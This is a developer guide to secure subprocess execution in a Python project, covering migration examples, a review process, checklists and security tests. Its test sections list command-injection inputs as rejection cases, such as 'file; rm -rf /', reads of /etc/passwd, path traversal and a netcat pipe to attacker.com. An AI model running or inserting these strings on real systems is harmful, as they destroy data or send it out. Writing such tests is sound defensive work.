# Subprocess Security Developer Guidelines

## Table of Contents

1. [Quick Start](#quick-start)
2. [Developer Guidelines](#developer-guidelines)
3. [Code Examples](#code-examples)
4. [Security Review Process](#security-review-process)
5. [Security Checklist](#security-checklist)
6. [Common Patterns](#common-patterns)
7. [Testing Guidelines](#testing-guidelines)
8. [Troubleshooting](#troubleshooting)

## Quick Start

### For New Developers

If you're new to secure subprocess usage in this project, follow these steps:

1. **Never use `subprocess` directly** - Use our secure execution module instead
2. **Import the secure execution module**:

   ```python
   from src.security.secure_execution import execute_secure_command, SecureExecutor
   ```

3. **Use the simple interface for basic commands**:

   ```python
   result = execute_secure_command(['python', '--version'])
   ```

4. **Check the result**:

   ```python
   if result.success:
       print(f"Output: {result.stdout}")
   else:
       print(f"Error: {result.stderr}")
   ```

### For Existing Code Migration

If you're migrating existing subprocess code:

1. **Find subprocess usage**: `grep -r "subprocess\." src/`
2. **Replace with secure alternatives** (see [Migration Examples](#migration-examples))
3. **Remove `# nosec` suppressions** after migration
4. **Test thoroughly** with security tests
5. **Request security review** before merging

## Developer Guidelines

### 1. Mandatory Security Rules

#### Rule 1: Never Use Direct subprocess

```python
# ❌ FORBIDDEN - Direct subprocess usage
import subprocess
subprocess.run(['python', 'script.py'])

# ✅ REQUIRED - Use secure execution module
from src.security.secure_execution import execute_secure_command
execute_secure_command(['python', 'script.py'])
```

#### Rule 2: Never Use shell=True

```python
# ❌ FORBIDDEN - Shell execution
subprocess.run('python script.py', shell=True)

# ✅ REQUIRED - List format with secure execution
execute_secure_command(['python', 'script.py'])
```

#### Rule 3: Always Validate Inputs

```python
# ❌ BAD - No input validation
def process_file(filename):
    execute_secure_command(['python', 'process.py', filename])

# ✅ GOOD - Input validation
def process_file(filename):
    # Validate filename
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename format")

    # Validate file exists
    if not Path(filename).exists():
        raise FileNotFoundError(f"File not found: {filename}")

    execute_secure_command(['python', 'process.py', filename])
```

#### Rule 4: Always Set Timeouts

```python
# ❌ BAD - No timeout
execute_secure_command(['python', 'long_script.py'])

# ✅ GOOD - Explicit timeout
execute_secure_command(['python', 'long_script.py'], timeout=600)
```

#### Rule 5: Handle Errors Properly

```python
# ❌ BAD - No error handling
result = execute_secure_command(['python', 'script.py'])
print(result.stdout)

# ✅ GOOD - Proper error handling
try:
    result = execute_secure_command(['python', 'script.py'])
    if result.success:
        print(result.stdout)
    else:
        logger.error(f"Script failed: {result.stderr}")
        raise RuntimeError(f"Script execution failed with code {result.returncode}")
except SecureExecutionError as e:
    logger.error(f"Security error: {e}")
    raise
```

### 2. Recommended Patterns

#### Pattern 1: Function Wrapper for Common Commands

```python
def run_python_script(script_name: str, args: List[str] = None, timeout: int = 300) -> bool:
    """
    Run a Python script securely.

    Args:
        script_name: Name of the script to run (validated)
        args: Additional arguments
        timeout: Timeout in seconds

    Returns:
        True if successful, False otherwise
    """
    # Validate script name
    allowed_scripts = ['process.py', 'validate.py', 'convert.py']
    if script_name not in allowed_scripts:
        raise ValueError(f"Script '{script_name}' not in allowed list")

    # Build command
    cmd = ['python', script_name]
    if args:
        cmd.extend(args)

    try:
        result = execute_secure_command(cmd, timeout=timeout)
        if result.success:
            logger.info(f"Script {script_name} completed successfully")
            return True
        else:
            logger.error(f"Script {script_name} failed: {result.stderr}")
            return False
    except SecureExecutionError as e:
        logger.error(f"Security error running {script_name}: {e}")
        return False

# Usage
success = run_python_script('process.py', ['--input', 'file.pdf'])
```

#### Pattern 2: Context Manager for Complex Operations

```python
from contextlib import contextmanager
from src.security.secure_execution import SecureTempExecutor

@contextmanager
def secure_processing_environment():
    """Context manager for secure processing with temporary directories."""
    with SecureTempExecutor() as executor:
        temp_dir = executor.create_temp_directory()
        logger.info(f"Created secure processing environment: {temp_dir}")

        try:
            yield executor, temp_dir
        except Exception as e:
            logger.error(f"Processing failed: {e}")
            raise
        finally:
            logger.info("Cleaning up secure processing environment")

# Usage
with secure_processing_environment() as (executor, temp_dir):
    # Process files in secure temporary directory
    result = executor.execute_command([
        'python', 'process.py',
        '--input', 'input.pdf',
        '--output', str(temp_dir / 'output.pdf')
    ])
```

#### Pattern 3: Configuration-Driven Execution

```python
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class CommandConfig:
    """Configuration for secure command execution."""
    executable: str
    args: List[str]
    timeout: int = 300
    allowed_executables: Optional[List[str]] = None
    working_directory: Optional[str] = None

def execute_configured_command(config: CommandConfig) -> ExecutionResult:
    """Execute command based on configuration."""
    # Create security context
    context = SecurityContext(
        allowed_executables=config.allowed_executables,
        timeout=config.timeout
    )

    executor = SecureExecutor(context)

    # Build command
    cmd = [config.executable] + config.args

    # Execute with configuration
    return executor.execute_command(
        cmd,
        cwd=Path(config.working_directory) if config.working_directory else None,
        timeout=config.timeout
    )

# Usage
config = CommandConfig(
    executable='python',
    args=['process.py', '--input', 'file.pdf'],
    timeout=600,
    allowed_executables=['python', 'mutool']
)

result = execute_configured_command(config)
```

### 3. Security Context Guidelines

#### When to Use Custom Security Context

```python
# Default context is fine for most cases
result = execute_secure_command(['python', '--version'])

# Use custom context when you need:
# 1. Different allowed executables
context = SecurityContext(allowed_executables=['git', 'python'])
executor = SecureExecutor(context)

# 2. Different timeout
context = SecurityContext(timeout=1800)  # 30 minutes for long operations
executor = SecureExecutor(context)

# 3. Restricted base path
context = SecurityContext(base_path=Path('/safe/directory'))
executor = SecureExecutor(context)

# 4. Custom environment variables
context = SecurityContext(
    environment_whitelist=['PATH', 'PYTHONPATH', 'CUSTOM_VAR']
)
executor = SecureExecutor(context)
```

#### Security Context Best Practices

```python
# ✅ GOOD - Minimal permissions
context = SecurityContext(
    allowed_executables=['python'],  # Only what you need
    timeout=300,                     # Reasonable timeout
    base_path=Path.cwd()            # Restrict to current directory
)

# ❌ BAD - Overly permissive
context = SecurityContext(
    allowed_executables=['*'],       # Too permissive
    timeout=3600,                   # Too long
    base_path=Path('/')             # Too broad
)
```

## Code Examples

### Migration Examples

#### Example 1: Simple subprocess.run Migration

**Before:**

```python
import subprocess

def check_python_version():
    result = subprocess.run(['python', '--version'], capture_output=True, text=True)  # nosec B603
    return result.stdout.strip()
```

**After:**

```python
from src.security.secure_execution import execute_secure_command

def check_python_version():
    """Check Python version securely."""
    try:
        result = execute_secure_command(['python', '--version'])
        if result.success:
            return result.stdout.strip()
        else:
            raise RuntimeError(f"Failed to get Python version: {result.stderr}")
    except SecureExecutionError as e:
        raise RuntimeError(f"Security error checking Python version: {e}")
```

#### Example 2: Complex subprocess with shell=True Migration

**Before:**

```python
import subprocess
import shlex

def process_pdf_files(input_dir, output_dir):
    # DANGEROUS - shell=True with user input
    cmd = f"find {input_dir} -name '*.pdf' -exec python process.py {{}} {output_dir} \\;"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)  # nosec B602
    return result.returncode == 0
```

**After:**

```python
from pathlib import Path
from src.security.secure_execution import SecureExecutor, SecurityContext

def process_pdf_files(input_dir: str, output_dir: str) -> bool:
    """Process PDF files securely."""
    # Validate directories
    input_path = Path(input_dir).resolve()
    output_path = Path(output_dir).resolve()

    if not input_path.exists():
        raise ValueError(f"Input directory does not exist: {input_dir}")

    output_path.mkdir(parents=True, exist_ok=True)

    # Find PDF files safely
    pdf_files = list(input_path.glob('*.pdf'))

    if not pdf_files:
        logger.info("No PDF files found")
        return True

    # Process each file securely
    context = SecurityContext(
        allowed_executables=['python'],
        timeout=600  # 10 minutes per file
    )
    executor = SecureExecutor(context)

    success_count = 0
    for pdf_file in pdf_files:
        try:
            result = executor.execute_command([
                'python', 'process.py',
                str(pdf_file),
                str(output_path)
            ])

            if result.success:
                success_count += 1
                logger.info(f"Successfully processed: {pdf_file.name}")
            else:
                logger.error(f"Failed to process {pdf_file.name}: {result.stderr}")

        except SecureExecutionError as e:
            logger.error(f"Security error processing {pdf_file.name}: {e}")

    logger.info(f"Processed {success_count}/{len(pdf_files)} files successfully")
    return success_count == len(pdf_files)
```

#### Example 3: Development Script Migration

**Before:**

```python
# scripts/autofix.py
import subprocess

def run_autofix():
    """Run code formatting and linting."""
    # Format code
    subprocess.run(['python', '-m', 'black', '.'])  # nosec B603

    # Fix linting issues
    subprocess.run(['python', '-m', 'ruff', 'check', '--fix', '.'])  # nosec B603

    # Type checking
    subprocess.run(['python', '-m', 'mypy', 'src/'])  # nosec B603

if __name__ == "__main__":
    run_autofix()
```

**After:**

```python
# scripts/autofix.py
from src.security.secure_execution import SecureExecutor, SecurityContext
import logging

logger = logging.getLogger(__name__)

def run_autofix() -> bool:
    """Run code formatting and linting securely."""
    context = SecurityContext(
        allowed_executables=['python', 'black', 'ruff', 'mypy'],
        timeout=300
    )
    executor = SecureExecutor(context)

    commands = [
        (['python', '-m', 'black', '.'], "Code formatting"),
        (['python', '-m', 'ruff', 'check', '--fix', '.'], "Linting fixes"),
        (['python', '-m', 'mypy', 'src/'], "Type checking")
    ]

    all_success = True

    for cmd, description in commands:
        try:
            logger.info(f"Running {description}...")
            result = executor.execute_command(cmd)

            if result.success:
                logger.info(f"{description} completed successfully")
            else:
                logger.error(f"{description} failed: {result.stderr}")
                all_success = False

        except SecureExecutionError as e:
            logger.error(f"Security error during {description}: {e}")
            all_success = False

    return all_success

if __name__ == "__main__":
    success = run_autofix()
    exit(0 if success else 1)
```

### Advanced Examples

#### Example 4: Batch Processing with Progress Tracking

```python
from typing import List, Callable
import time
from src.security.secure_execution import SecureExecutor, SecurityContext

class SecureBatchProcessor:
    """Secure batch processor with progress tracking."""

    def __init__(self, allowed_executables: List[str] = None):
        self.context = SecurityContext(
            allowed_executables=allowed_executables or ['python'],
            timeout=600
        )
        self.executor = SecureExecutor(self.context)

    def process_files(self,
                     files: List[Path],
                     command_template: List[str],
                     progress_callback: Callable[[int, int], None] = None) -> List[bool]:
        """
        Process multiple files with progress tracking.

        Args:
            files: List of files to process
            command_template: Command template with {} for file placeholder
            progress_callback: Optional progress callback function

        Returns:
            List of success/failure results
        """
        results = []

        for i, file_path in enumerate(files):
            # Update progress
            if progress_callback:
                progress_callback(i, len(files))

            # Build command for this file
            cmd = [arg.format(str(file_path)) if '{}' in arg else arg
                   for arg in command_template]

            try:
                result = self.executor.execute_command(cmd)
                success = result.success

                if success:
                    logger.info(f"Successfully processed: {file_path.name}")
                else:
                    logger.error(f"Failed to process {file_path.name}: {result.stderr}")

                results.append(success)

            except SecureExecutionError as e:
                logger.error(f"Security error processing {file_path.name}: {e}")
                results.append(False)

        # Final progress update
        if progress_callback:
            progress_callback(len(files), len(files))

        return results

# Usage
def progress_callback(current: int, total: int):
    percent = (current / total) * 100
    print(f"Progress: {current}/{total} ({percent:.1f}%)")

processor = SecureBatchProcessor(['python', 'mutool'])
pdf_files = list(Path('input').glob('*.pdf'))

results = processor.process_files(
    pdf_files,
    ['python', 'process.py', '--input', '{}', '--output', 'output/'],
    progress_callback
)

success_count = sum(results)
print(f"Successfully processed {success_count}/{len(pdf_files)} files")
```

#### Example 5: Pipeline Processing

```python
from typing import List, Dict, Any
from dataclasses import dataclass

@dataclass
class PipelineStep:
    """A step in a secure processing pipeline."""
    name: str
    command: List[str]
    timeout: int = 300
    required_files: List[str] = None
    output_files: List[str] = None

class SecurePipeline:
    """Secure processing pipeline."""

    def __init__(self, allowed_executables: List[str] = None):
        self.context = SecurityContext(
            allowed_executables=allowed_executables or ['python'],
            timeout=300
        )
        self.executor = SecureExecutor(self.context)
        self.steps: List[PipelineStep] = []

    def add_step(self, step: PipelineStep):
        """Add a step to the pipeline."""
        self.steps.append(step)

    def run_pipeline(self, input_file: Path, output_dir: Path) -> bool:
        """Run the complete pipeline."""
        logger.info(f"Starting pipeline for {input_file}")

        current_file = input_file

        for i, step in enumerate(self.steps):
            logger.info(f"Running step {i+1}/{len(self.steps)}: {step.name}")

            # Check required files
            if step.required_files:
                for req_file in step.required_files:
                    if not Path(req_file).exists():
                        logger.error(f"Required file missing: {req_file}")
                        return False

            # Build command with file substitution
            cmd = []
            for arg in step.command:
                if arg == '{input}':
                    cmd.append(str(current_file))
                elif arg == '{output_dir}':
                    cmd.append(str(output_dir))
                else:
                    cmd.append(arg)

            try:
                # Update timeout for this step
                self.executor.update_security_context(timeout=step.timeout)

                result = self.executor.execute_command(cmd)

                if not result.success:
                    logger.error(f"Step {step.name} failed: {result.stderr}")
                    return False

                logger.info(f"Step {step.name} completed successfully")

                # Update current file if step produces output
                if step.output_files:
                    current_file = Path(step.output_files[0])

            except SecureExecutionError as e:
                logger.error(f"Security error in step {step.name}: {e}")
                return False

        logger.info("Pipeline completed successfully")
        return True

# Usage
pipeline = SecurePipeline(['python', 'mutool', 'qpdf'])

# Add pipeline steps
pipeline.add_step(PipelineStep(
    name="Extract content",
    command=['python', 'extract.py', '--input', '{input}', '--output', '{output_dir}/extracted.json'],
    timeout=300
))

pipeline.add_step(PipelineStep(
    name="Process content",
    command=['python', 'process.py', '--config', '{output_dir}/extracted.json'],
    timeout=600
))

pipeline.add_step(PipelineStep(
    name="Generate PDF",
    command=['python', 'generate.py', '--input', '{output_dir}/processed.json', '--output', '{output_dir}/final.pdf'],
    timeout=300
))

# Run pipeline
success = pipeline.run_pipeline(
    Path('input/document.pdf'),
    Path('output')
)
```## Secur
ity Review Process

### 1. When Security Review is Required

Security review is **mandatory** for:

- Any new subprocess usage (even with secure execution module)
- Changes to existing subprocess code
- New executables added to allowed lists
- Changes to security context configurations
- New development scripts that execute commands
- Any code that processes user input for command execution

### 2. Security Review Checklist

Before requesting review, ensure your code passes this checklist:

#### Basic Security Requirements
- [ ] No direct `subprocess` imports or usage
- [ ] Uses `src.security.secure_execution` module
- [ ] No `shell=True` usage anywhere
- [ ] All commands use list format, not strings
- [ ] Input validation implemented for all user inputs
- [ ] Timeouts specified for all command executions
- [ ] Error handling implemented with proper logging
- [ ] No `# nosec` suppressions added

#### Advanced Security Requirements
- [ ] Executable whitelist is minimal and justified
- [ ] Working directory restrictions are appropriate
- [ ] Environment variable filtering is implemented
- [ ] Resource limits are considered and applied
- [ ] Audit logging is comprehensive
- [ ] Security tests are written and passing
- [ ] Documentation is updated

#### Code Quality Requirements
- [ ] Code follows project style guidelines
- [ ] Functions have proper docstrings with security notes
- [ ] Error messages don't leak sensitive information
- [ ] Logging levels are appropriate
- [ ] Performance impact is considered

### 3. Security Review Process Steps

#### Step 1: Self-Review
1. Run the security checklist above
2. Run security tests: `hatch run security-test`
3. Run bandit scan: `hatch run security-scan`
4. Test with malicious inputs to verify security

#### Step 2: Automated Checks
The CI/CD pipeline will automatically run:
- Security tests
- Bandit security scanning
- Code quality checks
- Integration tests

#### Step 3: Peer Review
1. Create pull request with security label
2. Request review from security team member
3. Address all security feedback
4. Re-run security tests after changes

#### Step 4: Security Team Review
Security team will review:
- Security architecture decisions
- Risk assessment
- Compliance with security guidelines
- Test coverage adequacy

### 4. Security Review Template

Use this template when requesting security review:

```markdown
## Security Review Request

### Change Summary
Brief description of what subprocess operations are being added/modified.

### Security Considerations
- **Executables used**: List all executables
- **Input sources**: Describe all input sources (user, file, network, etc.)
- **Validation implemented**: Describe input validation
- **Risk assessment**: Low/Medium/High risk and justification

### Testing
- [ ] Security tests written and passing
- [ ] Bandit scan clean
- [ ] Manual security testing completed
- [ ] Edge cases tested

### Documentation
- [ ] Code documented with security considerations
- [ ] Security guide updated if needed
- [ ] Examples provided for complex usage

### Reviewer Notes
Any specific areas you'd like the security reviewer to focus on.
```

## Security Checklist

### Pre-Development Checklist

Before writing any subprocess code:

- [ ] **Understand the requirement**: What command needs to be executed and why?
- [ ] **Assess alternatives**: Can the task be done without subprocess?
- [ ] **Identify inputs**: What inputs will the command receive?
- [ ] **Determine risk level**: High (user input), Medium (file input), Low (hardcoded)
- [ ] **Plan validation**: How will inputs be validated?
- [ ] **Choose security context**: What executables and restrictions are needed?

### Development Checklist

While writing subprocess code:

- [ ] **Import secure module**: `from src.security.secure_execution import ...`
- [ ] **Use list format**: Commands as `['cmd', 'arg1', 'arg2']`
- [ ] **Validate inputs**: All inputs validated before use
- [ ] **Set timeout**: Appropriate timeout for the operation
- [ ] **Handle errors**: Comprehensive error handling
- [ ] **Log security events**: Important operations logged
- [ ] **Write tests**: Security tests for the new code

### Testing Checklist

Before submitting code:

- [ ] **Unit tests pass**: All existing tests still pass
- [ ] **Security tests pass**: `hatch run security-test`
- [ ] **Bandit scan clean**: `hatch run security-scan`
- [ ] **Integration tests pass**: End-to-end functionality works
- [ ] **Manual security testing**: Tested with malicious inputs
- [ ] **Performance acceptable**: No significant performance regression

### Review Checklist

During code review:

- [ ] **Security requirements met**: All security guidelines followed
- [ ] **Code quality good**: Readable, maintainable code
- [ ] **Documentation complete**: Proper docstrings and comments
- [ ] **Tests comprehensive**: Good test coverage including security
- [ ] **No security regressions**: Existing security not weakened

## Common Patterns

### Pattern 1: Simple Command Execution

```python
from src.security.secure_execution import execute_secure_command
import logging

logger = logging.getLogger(__name__)

def get_python_version() -> str:
    """Get Python version securely."""
    try:
        result = execute_secure_command(['python', '--version'])
        if result.success:
            return result.stdout.strip()
        else:
            raise RuntimeError(f"Failed to get Python version: {result.stderr}")
    except SecureExecutionError as e:
        logger.error(f"Security error getting Python version: {e}")
        raise
```

### Pattern 2: File Processing

```python
from pathlib import Path
from src.security.secure_execution import execute_secure_command
import re

def process_pdf_file(input_file: str, output_file: str) -> bool:
    """Process PDF file securely."""
    # Validate input filename
    if not re.match(r'^[a-zA-Z0-9._-]+\.pdf$', input_file):
        raise ValueError("Invalid input filename format")

    # Validate paths
    input_path = Path(input_file).resolve()
    output_path = Path(output_file).resolve()

    # Ensure input exists
    if not input_path.exists():
        raise FileNotFoundError(f"Input file not found: {input_file}")

    # Ensure output directory exists
    output_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        result = execute_secure_command([
            'python', 'process_pdf.py',
            '--input', str(input_path),
            '--output', str(output_path)
        ], timeout=600)

        if result.success:
            logger.info(f"Successfully processed {input_file}")
            return True
        else:
            logger.error(f"Processing failed: {result.stderr}")
            return False

    except SecureExecutionError as e:
        logger.error(f"Security error processing {input_file}: {e}")
        return False
```

### Pattern 3: Development Script

```python
#!/usr/bin/env python3
"""
Secure development script template.
"""

import sys
import logging
from pathlib import Path
from src.security.secure_execution import SecureExecutor, SecurityContext

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def main():
    """Main script function."""
    # Create security context for development tools
    context = SecurityContext(
        allowed_executables=['python', 'black', 'ruff', 'pytest'],
        timeout=300,
        base_path=Path.cwd()
    )

    executor = SecureExecutor(context)

    # Define tasks
    tasks = [
        (['python', '-m', 'black', '.'], "Code formatting"),
        (['python', '-m', 'ruff', 'check', '--fix', '.'], "Linting"),
        (['python', '-m', 'pytest', 'tests/', '-v'], "Testing")
    ]

    success_count = 0

    for cmd, description in tasks:
        logger.info(f"Running {description}...")

        try:
            result = executor.execute_command(cmd)

            if result.success:
                logger.info(f"✅ {description} completed successfully")
                success_count += 1
            else:
                logger.error(f"❌ {description} failed: {result.stderr}")

        except SecureExecutionError as e:
            logger.error(f"❌ Security error during {description}: {e}")

    # Report results
    total_tasks = len(tasks)
    if success_count == total_tasks:
        logger.info(f"🎉 All {total_tasks} tasks completed successfully")
        return 0
    else:
        logger.error(f"💥 {total_tasks - success_count}/{total_tasks} tasks failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

### Pattern 4: Configuration-Based Execution

```python
from dataclasses import dataclass
from typing import List, Optional, Dict
import yaml

@dataclass
class SecureCommandConfig:
    """Configuration for secure command execution."""
    name: str
    executable: str
    args: List[str]
    timeout: int = 300
    working_directory: Optional[str] = None
    environment: Optional[Dict[str, str]] = None
    allowed_executables: Optional[List[str]] = None

class ConfigurableSecureExecutor:
    """Executor that runs commands based on configuration."""

    def __init__(self, config_file: Path):
        self.config_file = config_file
        self.commands = self._load_config()

    def _load_config(self) -> Dict[str, SecureCommandConfig]:
        """Load command configurations from file."""
        with open(self.config_file, 'r') as f:
            config_data = yaml.safe_load(f)

        commands = {}
        for name, cmd_config in config_data.get('commands', {}).items():
            commands[name] = SecureCommandConfig(
                name=name,
                **cmd_config
            )

        return commands

    def execute_command(self, command_name: str, **kwargs) -> ExecutionResult:
        """Execute a configured command."""
        if command_name not in self.commands:
            raise ValueError(f"Command '{command_name}' not found in configuration")

        config = self.commands[command_name]

        # Create security context
        context = SecurityContext(
            allowed_executables=config.allowed_executables or [config.executable],
            timeout=config.timeout
        )

        executor = SecureExecutor(context)

        # Build command with substitutions
        cmd = [config.executable] + config.args

        # Substitute placeholders
        for i, arg in enumerate(cmd):
            for key, value in kwargs.items():
                cmd[i] = cmd[i].replace(f'{{{key}}}', str(value))

        # Execute command
        return executor.execute_command(
            cmd,
            cwd=Path(config.working_directory) if config.working_directory else None,
            env=config.environment
        )

# Example configuration file (commands.yaml):
"""
commands:
  process_pdf:
    executable: python
    args: ['process.py', '--input', '{input_file}', '--output', '{output_file}']
    timeout: 600
    allowed_executables: ['python']

  run_tests:
    executable: python
    args: ['-m', 'pytest', 'tests/', '-v']
    timeout: 1800
    allowed_executables: ['python']
"""

# Usage
executor = ConfigurableSecureExecutor(Path('commands.yaml'))
result = executor.execute_command('process_pdf',
                                input_file='input.pdf',
                                output_file='output.pdf')
```

## Testing Guidelines

### 1. Security Test Requirements

Every subprocess operation must have corresponding security tests:

#### Basic Security Tests

```python
def test_command_validation():
    """Test that command validation works correctly."""
    executor = SecureExecutor()

    # Test valid command
    result = executor.validate_command(['python', '--version'])
    assert result.is_valid

    # Test invalid executable
    result = executor.validate_command(['rm', '-rf', '/'])
    assert not result.is_valid
    assert "not in the allowed list" in result.error_message

def test_input_validation():
    """Test that input validation prevents malicious inputs."""
    # Test your specific input validation
    with pytest.raises(ValueError):
        process_file("../../../etc/passwd")

    with pytest.raises(ValueError):
        process_file("file; rm -rf /")

def test_timeout_enforcement():
    """Test that timeouts are enforced."""
    context = SecurityContext(timeout=1)
    executor = SecureExecutor(context)

    with pytest.raises(SecureExecutionError):
        executor.execute_command(['python', '-c', 'import time; time.sleep(5)'])
```

#### Integration Security Tests

```python
def test_end_to_end_security():
    """Test complete workflow security."""
    # Test with various inputs including malicious ones
    test_inputs = [
        "normal_file.pdf",
        "file with spaces.pdf",
        "file-with-dashes.pdf",
        # These should be rejected
        "../../../etc/passwd",
        "file; rm -rf /",
        "file && cat /etc/passwd",
    ]

    for test_input in test_inputs:
        try:
            result = your_function(test_input)
            # Should either succeed safely or fail with proper error
            assert isinstance(result, (bool, ExecutionResult))
        except (ValueError, SecurityError):
            # Security rejection is acceptable
            pass
```

### 2. Test Organization

Organize security tests by category:

```
tests/
├── security/
│   ├── test_secure_execution.py          # Core security module tests
│   ├── test_command_validation.py        # Command validation tests
│   ├── test_input_validation.py          # Input validation tests
│   ├── test_path_security.py             # Path traversal tests
│   ├── test_resource_limits.py           # Timeout and resource tests
│   └── test_integration_security.py      # End-to-end security tests
├── unit/
│   └── test_your_module.py               # Regular unit tests
└── integration/
    └── test_your_workflow.py             # Integration tests
```

### 3. Security Test Utilities

Create utilities for common security testing patterns:

```python
# tests/security/utils.py
"""Security testing utilities."""

import pytest
from typing import List, Callable
from src.security.secure_execution import SecureExecutionError

def test_malicious_inputs(func: Callable, malicious_inputs: List[str]):
    """Test function with malicious inputs."""
    for malicious_input in malicious_inputs:
        try:
            result = func(malicious_input)
            # If it succeeds, ensure it's safe
            assert result is not None
        except (ValueError, SecurityError, SecureExecutionError):
            # Security rejection is good
            pass
        except Exception as e:
            # Unexpected errors should be investigated
            pytest.fail(f"Unexpected error with input '{malicious_input}': {e}")

def assert_secure_execution(cmd: List[str], should_succeed: bool = True):
    """Assert that command execution is secure."""
    from src.security.secure_execution import execute_secure_command

    try:
        result = execute_secure_command(cmd, timeout=10)
        if should_succeed:
            assert result is not None
        else:
            pytest.fail(f"Command should have failed: {cmd}")
    except SecureExecutionError:
        if should_succeed:
            pytest.fail(f"Command should have succeeded: {cmd}")
        # Expected failure for security reasons

# Usage in tests
def test_my_function_security():
    malicious_inputs = [
        "../../../etc/passwd",
        "file; rm -rf /",
        "file && cat /etc/passwd",
        "file | nc attacker.com 1234"
    ]

    test_malicious_inputs(my_function, malicious_inputs)
```

## Troubleshooting

### Common Issues and Solutions

#### Issue 1: "Command not in allowed list"

```
SecureExecutionError: Executable 'xyz' is not in the allowed list
```

**Solution:**

```python
# Add executable to security context
context = SecurityContext(
    allowed_executables=['python', 'xyz']  # Add your executable
)
executor = SecureExecutor(context)
```

#### Issue 2: "Working directory outside allowed path"

```
SecureExecutionError: Working directory '/some/path' is outside allowed base path
```

**Solution:**

```python
# Either use a path within the base directory
result = executor.execute_command(cmd, cwd='./subdir')

# Or update the base path
context = SecurityContext(base_path=Path('/allowed/base'))
executor = SecureExecutor(context)
```

#### Issue 3: "Command timed out"

```
SecureExecutionError: Command timed out after 300 seconds
```

**Solution:**

```python
# Increase timeout for long-running commands
result = execute_secure_command(cmd, timeout=1800)  # 30 minutes

# Or update security context
context = SecurityContext(timeout=1800)
executor = SecureExecutor(context)
```

#### Issue 4: "Environment variable not in whitelist"

```
Warning: Environment variable 'CUSTOM_VAR' not in whitelist, skipping
```

**Solution:**

```python
# Add environment variable to whitelist
context = SecurityContext(
    environment_whitelist=['PATH', 'PYTHONPATH', 'CUSTOM_VAR']
)
executor = SecureExecutor(context)
```

### Debugging Security Issues

#### Enable Debug Logging

```python
import logging

# Enable debug logging for security module
logging.getLogger('src.security').setLevel(logging.DEBUG)

# Or enable for all loggers
logging.basicConfig(level=logging.DEBUG)
```

#### Test Command Validation Separately

```python
from src.security.secure_execution import validate_command_security

# Test validation without execution
result = validate_command_security(['your', 'command', 'here'])
print(f"Valid: {result.is_valid}")
print(f"Error: {result.error_message}")
print(f"Warnings: {result.warnings}")
```

#### Check Security Context

```python
executor = SecureExecutor()
context = executor.get_security_context()

print(f"Allowed executables: {context.allowed_executables}")
print(f"Base path: {context.base_path}")
print(f"Timeout: {context.timeout}")
print(f"Environment whitelist: {context.environment_whitelist}")
```

### Getting Help

#### Internal Resources

- **Security Guide**: `docs/SUBPROCESS_SECURITY_GUIDE.md`
- **API Documentation**: `docs/api/security/secure_execution.md`
- **Example Code**: `examples/subprocess_migration_example.py`
- **Test Examples**: `tests/test_secure_execution.py`

#### External Resources

- **Plumbum Documentation**: <https://plumbum.readthedocs.io/>
- **OWASP Command Injection**: <https://owasp.org/www-community/attacks/Command_Injection>
- **Python Security**: <https://python-security.readthedocs.io/>

#### Contact

- **Security Team**: Create issue with `security` label
- **Code Review**: Request review from security team member
- **Questions**: Use team chat with `#security` tag

---

**Document Version**: 1.0
**Last Updated**: August 3, 2025
**Next Review**: February 3, 2026

This document is part of the subprocess security hardening initiative. For updates or questions, please contact the security team.
